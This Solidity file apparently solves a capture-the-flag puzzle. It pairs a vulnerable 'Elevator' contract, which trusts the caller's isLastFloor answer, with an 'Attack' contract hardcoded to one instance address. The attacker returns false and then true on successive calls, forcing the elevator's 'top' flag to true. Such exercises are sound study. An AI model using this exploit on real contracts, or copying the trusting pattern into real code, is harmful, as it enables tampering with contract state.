// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


contract Attack is Building {

  Elevator public elevator;

  constructor() public {
    elevator = Elevator(0x8483513BD342b88be76794C8b516Dad108889EEA);
  }

  function attack(uint _floor) public {
    elevator.goTo(_floor);
  }

  function isLastFloor(uint) public override returns (bool) {
    uint currentFloor = elevator.floor();
    
    if (currentFloor == 0) {
      return false;
    } else if (currentFloor > 0) {
      return true;
    }
    
  }
}